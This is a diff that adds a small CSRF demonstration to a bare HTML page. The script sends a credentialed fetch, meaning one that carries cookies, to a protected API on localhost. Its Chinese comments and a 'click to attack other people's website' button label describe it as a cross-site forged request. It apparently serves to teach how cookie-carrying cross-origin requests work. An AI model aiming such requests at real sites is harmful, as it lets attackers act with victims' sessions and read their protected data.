@@ -4,8 +4,21 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Document</title>
+  <script>
+    const API_HOST = "https://localhost:3001";
+
+    function forgeReqWithCredentials() {
+      // 在跨站点伪造携带cookie凭据的csrf攻击请求
+      fetch(`${API_HOST}/api/protected-resource`, {
+        credentials: "include",
+      }).then(res => res.text()).then(res => {
+        console.log("在非法站点上攻击获取受保护的资源", res)
+      });
+    }
+  </script>
 </head>
 <body>
   <h1>index3</h1>
+  <div onclick="forgeReqWithCredentials">点击攻击别人的网站</div>
 </body>
 </html>
